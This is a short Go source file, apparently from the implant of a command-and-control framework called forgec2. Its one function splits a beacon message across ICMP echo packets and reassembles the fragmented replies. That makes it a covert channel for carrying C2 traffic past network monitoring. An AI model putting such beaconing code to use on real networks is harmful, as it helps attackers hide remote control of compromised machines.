//go:build linux || windows
// +build linux windows

package main

import (
	"fmt"
	"strconv"

	"github.com/forgec2/forgec2/pkg/protocol"
)

// sendICMPBeaconFramed splits a v2 envelope across ICMP echo payloads and
// reassembles the replies. sendOne must transmit one Echo and return the
// corresponding Echo Reply data (or nil on failure).
func sendICMPBeaconFramed(body []byte, sendOne func(payload []byte, seq int) []byte) []byte {
	frags := protocol.ICMPFragSplit(body)
	if len(frags) == 0 {
		return sendOne(body, 1)
	}
	asm := protocol.NewICMPAssembler()
	var complete []byte
	for i, f := range frags {
		reply := sendOne(f, i+1)
		if reply == nil {
			return nil
		}
		if protocol.ICMPMaybePlain(reply) {
			// Server answered without fragmentation (tiny reply).
			if len(frags) == 1 {
				return reply
			}
			continue
		}
		msgID, total, index, payload, ok := protocol.ICMPFragParse(reply)
		if !ok {
			continue
		}
		out, err := asm.Add("c2:"+strconv.FormatUint(uint64(msgID), 10), total, index, payload)
		if err != nil {
			if Debug {
				fmt.Printf("[icmp] reassemble: %v\n", err)
			}
			return nil
		}
		if out != nil {
			complete = out
		}
	}
	return complete
}
